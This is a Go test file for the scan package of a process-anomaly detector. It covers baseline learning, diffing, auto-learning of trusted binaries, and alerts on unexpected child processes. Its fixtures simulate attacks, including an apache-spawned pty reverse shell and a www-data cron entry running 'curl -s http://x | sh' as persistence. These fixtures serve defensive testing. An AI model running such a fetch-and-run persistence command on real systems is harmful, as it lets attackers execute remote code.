// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Paul Borile

package scan

import (
	"context"
	"io/fs"
	"os"
	"testing"
	"time"

	"github.com/paulborile/cenziadah/internal/baseline"
	"github.com/paulborile/cenziadah/internal/detector"
	"github.com/paulborile/cenziadah/internal/engine"
	"github.com/paulborile/cenziadah/internal/model"
	"github.com/paulborile/cenziadah/internal/procfs"
)

func report(pid int, fs ...model.Finding) model.Report {
	return model.Report{Target: model.TargetDesc{PID: pid}, Findings: fs}
}

func finding(tech model.Technique, detail string) model.Finding {
	return model.Finding{Technique: tech, Severity: model.SevHigh, Title: "t", Detail: detail}
}

func TestDiffFirstSweepAllNew(t *testing.T) {
	cur := Result{Reports: []model.Report{report(1, finding(model.TechMapsRWX, "a"))}}
	ev := Diff(nil, cur)
	if len(ev) != 1 || ev[0].Kind != model.EventNew {
		t.Fatalf("events = %+v", ev)
	}
}

func TestDiffNewResolvedAndSteady(t *testing.T) {
	steady := finding(model.TechMapsRWX, "steady")
	gone := finding(model.TechUnexpectedChild, "gone")
	fresh := finding(model.TechUnexpectedDest, "fresh")
	suppressed := finding(model.TechMapsAnonExec, "jit")
	suppressed.Suppressed = true

	prev := Result{Reports: []model.Report{report(1, steady, gone)}}
	cur := Result{Reports: []model.Report{report(1, steady, fresh, suppressed)}}
	ev := Diff(&prev, cur)

	got := map[model.EventKind][]string{}
	for _, e := range ev {
		got[e.Kind] = append(got[e.Kind], e.Finding.Detail)
	}
	if len(got[model.EventNew]) != 1 || got[model.EventNew][0] != "fresh" {
		t.Errorf("new = %v, want [fresh]", got[model.EventNew])
	}
	if len(got[model.EventResolved]) != 1 || got[model.EventResolved][0] != "gone" {
		t.Errorf("resolved = %v, want [gone]", got[model.EventResolved])
	}
}

func TestDiffSteadyStateIsSilent(t *testing.T) {
	r := Result{Reports: []model.Report{report(1, finding(model.TechMapsRWX, "a"))}}
	if ev := Diff(&r, r); len(ev) != 0 {
		t.Errorf("unchanged sweeps must produce no events, got %+v", ev)
	}
}

// Learn records the current state as known-good; a later sweep then stays quiet
// for that state and reports only what is new: here a rogue child appearing.
func TestLearnThenScanReportsOnlyNewState(t *testing.T) {
	jit := target(10, "/usr/bin/gjs", jitRegion)
	h := &fakeHost{
		entries: []procfs.ProcEntry{proc(10, "/usr/bin/gjs")},
		targets: map[int]*detector.Target{10: jit},
	}
	s := h.scanner(Options{})
	set, learned, err := s.Learn(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if set.Len() != 1 || len(learned.Reports[0].Active()) != 0 {
		t.Fatalf("learn sweep: %d identities, active=%+v", set.Len(), learned.Reports[0].Active())
	}
	// The rwx region was accepted as normal, but must be visible as such: a host
	// that is already compromised when watch starts must not be absorbed silently.
	if len(learned.Accepted) != 1 || learned.Accepted[0].Kind != model.EventLearned ||
		learned.Accepted[0].Finding.Technique != model.TechMapsRWX {
		t.Fatalf("accepted = %+v, want the rwx finding as a learned event", learned.Accepted)
	}
	s.SetBaselines(set)

	jit.Children = []procfs.Child{{PID: 11, Exe: "/bin/sh", Cmdline: "sh -c id"}}
	cur, _ := s.Scan(context.Background())
	ev := Diff(&learned, cur)
	if len(ev) != 1 || ev[0].Finding.Technique != model.TechUnexpectedChild {
		t.Fatalf("want exactly the rogue child as new, got %+v", ev)
	}
}

// Children whose exe is unreadable (setuid helpers) cannot be allow-listed by
// path; ones already running at learn time must stay quiet, while a NEW
// unreadable child (an exploit's shell) must still alert.
func TestPreExistingUnreadableChildIsAccepted(t *testing.T) {
	started := now.Add(-time.Hour)
	parent := target(10, "/usr/bin/gnome-keyring-daemon")
	parent.Children = []procfs.Child{{PID: 11, StartedAt: started}} // exe hidden
	h := &fakeHost{
		entries: []procfs.ProcEntry{proc(10, "/usr/bin/gnome-keyring-daemon"), {PID: 11, PPID: 10, StartedAt: started}},
		targets: map[int]*detector.Target{10: parent},
		// the setuid child itself is unreadable, as in reality
		errs: map[int]error{11: &os.PathError{Op: "open", Path: "/proc/11/maps", Err: fs.ErrPermission}},
	}
	s := h.scanner(Options{})
	set, learned, _ := s.Learn(context.Background())
	s.SetBaselines(set)
	if n := len(learned.Reports[0].Active()); n != 0 {
		t.Fatalf("learn sweep: pre-existing child alerted (%d active)", n)
	}

	cur, _ := s.Scan(context.Background())
	if n := len(cur.Reports[0].Active()); n != 0 {
		t.Fatalf("later sweep: pre-existing child alerted (%d active): %+v", n, cur.Reports[0].Active())
	}

	parent.Children = append(parent.Children, procfs.Child{PID: 12, StartedAt: now}) // new, exe hidden
	cur, _ = s.Scan(context.Background())
	active := cur.Reports[0].Active()
	if len(active) != 1 || active[0].Severity != model.SevHigh {
		t.Fatalf("new unreadable child must alert HIGH, got %+v", active)
	}
}

// A package upgrade replacing a running binary makes the kernel report its exe
// as "... (deleted)"; the process must keep its learned identity.
func TestIdentitySurvivesBinaryUpgrade(t *testing.T) {
	before := model.TargetDesc{Exe: "/usr/share/code/code", BuildID: "b1", Name: "code"}
	after := before
	after.Exe += " (deleted)"
	if Identity(before) != Identity(after) {
		t.Errorf("identity changed on upgrade: %q vs %q", Identity(before), Identity(after))
	}
}

// A program first seen after learning (e.g. a new version after an upgrade) is
// learned on first sight when its binary is package-installed, and reported;
// its pre-existing JIT region is accepted, not alerted. An untrusted binary
// (in /tmp, a home dir...) is never auto-learned: it keeps the strict check.
func TestAutoLearnTrustedNewProgramOnly(t *testing.T) {
	h := &fakeHost{
		entries: []procfs.ProcEntry{proc(1, "/sbin/init")},
		targets: map[int]*detector.Target{
			1:  target(1, "/sbin/init"),
			20: target(20, "/usr/share/code/code", jitRegion),
			30: target(30, "/tmp/evil", jitRegion),
		},
	}
	s := h.scanner(Options{AutoLearn: true})
	s.trusted = func(pid int) bool { return pid == 20 }
	set, _, _ := s.Learn(context.Background())
	s.SetBaselines(set)

	h.entries = append(h.entries, proc(20, "/usr/share/code/code"), proc(30, "/tmp/evil"))
	res, _ := s.Scan(context.Background())

	if len(res.NewPrograms) != 1 || res.NewPrograms[0].PID != 20 {
		t.Fatalf("new programs = %+v, want only pid 20", res.NewPrograms)
	}
	if len(res.Accepted) != 1 || res.Accepted[0].Target.PID != 20 || res.Accepted[0].Finding.Technique != model.TechMapsRWX {
		t.Errorf("accepted = %+v, want pid 20's rwx JIT region", res.Accepted)
	}
	byPID := map[int]model.Report{}
	for _, r := range res.Reports {
		byPID[r.Target.PID] = r
	}
	if n := len(byPID[20].Active()); n != 0 {
		t.Errorf("auto-learned program should be SAFE, has %d active", n)
	}
	if byPID[30].MaxSeverity() != model.SevCritical {
		t.Errorf("untrusted new binary must keep the strict check, got %v", byPID[30].MaxSeverity())
	}
	if set.Lookup(Identity(byPID[30].Target)) != nil {
		t.Error("untrusted binary was learned")
	}
}

func TestAutoLearnOffByDefault(t *testing.T) {
	h := &fakeHost{
		entries: []procfs.ProcEntry{proc(1, "/sbin/init")},
		targets: map[int]*detector.Target{1: target(1, "/sbin/init"), 20: target(20, "/usr/share/code/code", jitRegion)},
	}
	s := h.scanner(Options{})
	s.trusted = func(int) bool { return true }
	set, _, _ := s.Learn(context.Background())
	s.SetBaselines(set)
	h.entries = append(h.entries, proc(20, "/usr/share/code/code"))
	res, _ := s.Scan(context.Background())
	if len(res.NewPrograms) != 0 || res.Reports[1].MaxSeverity() != model.SevCritical {
		t.Errorf("without AutoLearn nothing may be learned: new=%+v", res.NewPrograms)
	}
}

func TestBaselineStates(t *testing.T) {
	h := &fakeHost{
		entries: []procfs.ProcEntry{proc(1, "/sbin/init")},
		targets: map[int]*detector.Target{
			1:  target(1, "/sbin/init"),
			20: target(20, "/usr/bin/tail"),
			30: target(30, "/tmp/evil"),
		},
	}
	s := h.scanner(Options{AutoLearn: true, MinAge: 10 * time.Second})
	s.trusted = func(pid int) bool { return pid == 20 }
	set, learned, _ := s.Learn(context.Background())
	s.SetBaselines(set)
	if got := learned.Reports[0].Baseline; got != model.BaselineNew {
		t.Errorf("learn sweep: %q, want new", got)
	}

	youngInit := proc(2, "/sbin/init") // same program as pid 1: baseline known
	youngInit.Name = "p1"              // same identity as pid 1 (name is part of it)
	youngInit.StartedAt = now
	youngEvil := proc(3, "/tmp/evil")
	youngEvil.StartedAt = now
	h.entries = append(h.entries, proc(20, "/usr/bin/tail"), proc(30, "/tmp/evil"), youngInit, youngEvil)
	res, _ := s.Scan(context.Background())
	want := map[int]model.BaselineState{1: model.BaselineChecked, 20: model.BaselineNew, 30: model.BaselineNone}
	for _, r := range res.Reports {
		if r.Baseline != want[r.Target.PID] {
			t.Errorf("sweep 1 pid %d: %q, want %q", r.Target.PID, r.Baseline, want[r.Target.PID])
		}
	}
	waiting := map[int]model.BaselineState{}
	for _, sk := range res.Skipped {
		waiting[sk.PID] = sk.Baseline
	}
	if waiting[2] != model.BaselineKnown || waiting[3] != model.BaselineNone {
		t.Errorf("waiting states = %v, want 2:known 3:none", waiting)
	}

	res, _ = s.Scan(context.Background())
	for _, r := range res.Reports {
		if r.Target.PID == 20 && r.Baseline != model.BaselineChecked {
			t.Errorf("auto-learned program should be checked on the next sweep, got %q", r.Baseline)
		}
	}
}

// The interactive-shell rule must quiet a user's terminal but NOT an attacker's
// pty-upgraded reverse shell, which has the same shape (shell + terminal).
func TestInteractiveShellNeedsLegitimacy(t *testing.T) {
	old := now.Add(-time.Hour)
	entry := func(pid, ppid int, exe, name string, started time.Time) procfs.ProcEntry {
		return procfs.ProcEntry{PID: pid, PPID: ppid, Exe: exe, Name: name, StartedAt: started}
	}
	tgt := func(pid int, exe, name string) *detector.Target {
		return &detector.Target{Desc: model.TargetDesc{PID: pid, Exe: exe, Name: name, BuildID: "b1"}}
	}
	ghostty := tgt(100, "/usr/bin/ghostty", "ghostty")
	ghostty.Children = []procfs.Child{{PID: 101, Exe: "/usr/bin/bash", StartedAt: old}} // terminals start shells
	termBash := tgt(101, "/usr/bin/bash", "bash")
	apache := tgt(200, "/usr/sbin/apache2", "apache2")

	h := &fakeHost{
		shells: map[int]bool{101: true},
		entries: []procfs.ProcEntry{
			entry(100, 1, "/usr/bin/ghostty", "ghostty", old),
			entry(101, 100, "/usr/bin/bash", "bash", old),
			entry(200, 1, "/usr/sbin/apache2", "apache2", old),
		},
		targets: map[int]*detector.Target{100: ghostty, 101: termBash, 200: apache},
	}
	s := h.scanner(Options{})
	set, _, _ := s.Learn(context.Background())
	s.SetBaselines(set)

	// After learning: a new terminal tab (ghostty -> bash 102), a nested shell
	// (bash 101 -> bash 103), and the attack chain apache -> python3 -> bash 302.
	newTab, nested, pyPTY, ptyBash := tgt(102, "/usr/bin/bash", "bash"), tgt(103, "/usr/bin/bash", "bash"),
		tgt(301, "/usr/bin/python3", "python3"), tgt(302, "/usr/bin/bash", "bash")
	for _, sh := range []*detector.Target{termBash, newTab, nested, ptyBash} {
		sh.Children = []procfs.Child{{PID: sh.Desc.PID + 1000, Exe: "/usr/bin/wget", StartedAt: now}} // a typed command
	}
	h.shells[102], h.shells[103], h.shells[302] = true, true, true
	h.entries = append(h.entries,
		entry(102, 100, "/usr/bin/bash", "bash", old),
		entry(103, 101, "/usr/bin/bash", "bash", old),
		entry(301, 200, "/usr/bin/python3", "python3", old),
		entry(302, 301, "/usr/bin/bash", "bash", old),
	)
	for _, x := range []*detector.Target{newTab, nested, pyPTY, ptyBash} {
		h.targets[x.Desc.PID] = x
	}

	res, _ := s.Scan(context.Background())
	childAlert := map[int]bool{}
	for _, r := range res.Reports {
		for _, f := range r.Active() {
			if f.Technique == model.TechUnexpectedChild && f.Severity == model.SevHigh {
				childAlert[r.Target.PID] = true
			}
		}
	}
	for pid, name := range map[int]string{101: "terminal shell present at start", 102: "new terminal tab", 103: "nested shell"} {
		if childAlert[pid] {
			t.Errorf("%s (pid %d): a typed command must not alert", name, pid)
		}
	}
	if !childAlert[302] {
		t.Error("attacker's pty shell under apache -> python3: commands typed into it must alert")
	}
}

// The production cron.daily tree: cron -> CRON -> sh (job from /etc/crontab) ->
// run-parts -> scripts. Everything the job starts is its own work. A job from a
// www-data crontab is not root-configured: what it starts keeps alerting.
func TestCronJobTree(t *testing.T) {
	old := now.Add(-time.Hour)
	const daily = "/bin/sh -c test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }"
	e := func(pid, ppid int, exe, cmd string) procfs.ProcEntry {
		return procfs.ProcEntry{PID: pid, PPID: ppid, Exe: exe, Name: "p", Cmdline: cmd, StartedAt: old}
	}
	tg := func(pid int, exe string, child procfs.Child) *detector.Target {
		return &detector.Target{Desc: model.TargetDesc{PID: pid, Exe: exe, Name: "p", BuildID: "b1"}, Children: []procfs.Child{child}}
	}
	h := &fakeHost{
		cronJobs: map[string]string{daily: "/etc/crontab"},
		entries: []procfs.ProcEntry{
			e(10, 1, "/usr/sbin/cron", "/usr/sbin/cron -f"),
			e(11, 10, "/usr/sbin/cron", "/usr/sbin/CRON -f"),
			e(12, 11, "/usr/bin/dash", daily),
			e(13, 12, "/usr/bin/run-parts", "run-parts --report /etc/cron.daily"),
			e(20, 10, "/usr/sbin/cron", "/usr/sbin/CRON -f"),
			e(21, 20, "/usr/bin/dash", "/bin/sh -c curl -s http://x | sh"), // www-data persistence
		},
		targets: map[int]*detector.Target{
			12: tg(12, "/usr/bin/dash", procfs.Child{PID: 13, Exe: "/usr/bin/run-parts", Trusted: true}),
			13: tg(13, "/usr/bin/run-parts", procfs.Child{PID: 14, Exe: "/usr/bin/dash", Cmdline: "/bin/sh /etc/cron.daily/logrotate", Trusted: true}),
			21: tg(21, "/usr/bin/dash", procfs.Child{PID: 22, Exe: "/usr/bin/curl", Trusted: true}),
		},
	}
	for _, pid := range []int{10, 11, 20} {
		h.targets[pid] = &detector.Target{Desc: model.TargetDesc{PID: pid, Exe: "/usr/sbin/cron", Name: "cron", BuildID: "b1"}}
	}
	res, _ := h.scanner(Options{}).Scan(context.Background())
	for _, r := range res.Reports {
		active := len(r.Active())
		switch r.Target.PID {
		case 12, 13:
			if active != 0 {
				t.Errorf("pid %d is part of the root cron job; its children must not alert: %+v", r.Target.PID, r.Active())
			}
		case 21:
			if active != 1 || r.MaxSeverity() < model.SevMedium {
				t.Errorf("www-data cron job's curl must alert, got %+v", r.Active())
			}
		}
	}
}

// apt-daily.service (Type=oneshot) runs apt.systemd.daily, which starts apt-get,
// python3 unattended-upgrade, ...: the whole unit is the batch job's work.
func TestOneshotUnitChildrenAreTheJobsWork(t *testing.T) {
	tg := func(pid int, exe string, child procfs.Child) *detector.Target {
		return &detector.Target{Desc: model.TargetDesc{PID: pid, Exe: exe, Name: "p", BuildID: "b1"}, Children: []procfs.Child{child}}
	}
	h := &fakeHost{
		oneshot: map[int]string{50: "apt-daily.service"},
		entries: []procfs.ProcEntry{proc(50, "/usr/bin/dash"), proc(60, "/usr/sbin/apache2")},
		targets: map[int]*detector.Target{
			50: tg(50, "/usr/bin/dash", procfs.Child{PID: 51, Exe: "/usr/bin/python3.12", Trusted: true}),
			60: tg(60, "/usr/sbin/apache2", procfs.Child{PID: 61, Exe: "/usr/bin/python3.12", Trusted: true}),
		},
	}
	res, _ := h.scanner(Options{}).Scan(context.Background())
	for _, r := range res.Reports {
		if r.Target.PID == 50 && len(r.Active()) != 0 {
			t.Errorf("one-shot unit's work must not alert: %+v", r.Active())
		}
		if r.Target.PID == 60 && r.MaxSeverity() < model.SevMedium {
			t.Errorf("apache2 (not a one-shot unit) starting python must alert, got %v", r.MaxSeverity())
		}
	}
}

// An Android app update leaves app_process64 unchanged but gets a new install
// directory: the updated app is a new program, auto-learned, not checked
// against the old version's state. The same version with changed state is
// still checked against its baseline.
func TestAndroidAppUpdateIsANewProgram(t *testing.T) {
	const zygote = "/system/bin/app_process64"
	app := func(pid int, install string, regions ...procfs.Region) *detector.Target {
		tg := target(pid, zygote, regions...)
		tg.Desc.Name, tg.Desc.AppInstall = "com.whatsapp", install
		return tg
	}
	const v1, v2 = "/data/app/~~a==/com.whatsapp-1==", "/data/app/~~b==/com.whatsapp-2=="
	h := &fakeHost{
		entries: []procfs.ProcEntry{proc(40, zygote)},
		targets: map[int]*detector.Target{40: app(40, v1)},
	}
	s := h.scanner(Options{AutoLearn: true})
	s.trusted = func(int) bool { return true }
	set, _, _ := s.Learn(context.Background())
	s.SetBaselines(set)

	h.entries = []procfs.ProcEntry{proc(41, zygote), proc(42, zygote)}
	h.targets = map[int]*detector.Target{41: app(41, v2, jitRegion), 42: app(42, v1, jitRegion)}
	res, _ := s.Scan(context.Background())

	if len(res.NewPrograms) != 1 || res.NewPrograms[0].PID != 41 {
		t.Fatalf("new programs = %+v, want only the updated app (pid 41)", res.NewPrograms)
	}
	byPID := map[int]model.Report{}
	for _, r := range res.Reports {
		byPID[r.Target.PID] = r
	}
	if n := len(byPID[41].Active()); n != 0 {
		t.Errorf("updated app should be learned as SAFE, has %d active", n)
	}
	if byPID[42].Baseline != model.BaselineChecked || byPID[42].MaxSeverity() != model.SevCritical {
		t.Errorf("same version with new state must be checked: baseline=%v sev=%v", byPID[42].Baseline, byPID[42].MaxSeverity())
	}
}

// Only suppressed, upgrade-marked build-id findings are applied and reported
// as accepted; an active one (a user-writable library changed) is not.
func TestApplyUpgradesOnlyMarkedFindings(t *testing.T) {
	set := baseline.NewSet()
	set.Add("id", &model.Snapshot{})
	s := (&fakeHost{}).scanner(Options{Baselines: set})
	up := model.Finding{Technique: model.TechModuleBuildIDDiff, Suppressed: true,
		Evidence: map[string]any{"path": "/usr/lib/libudev.so.1", detector.EvidenceUpgraded: true}}
	active := model.Finding{Technique: model.TechModuleBuildIDDiff, Evidence: map[string]any{"path": "/home/u/lib.so"}}
	got := s.applyUpgrades("id", target(1, "/usr/bin/gjs"), engine.NewSweepCache(), []model.Finding{up, active})
	if len(got) != 1 || got[0].Evidence["path"] != "/usr/lib/libudev.so.1" {
		t.Errorf("accepted = %+v, want only the upgraded library", got)
	}
}
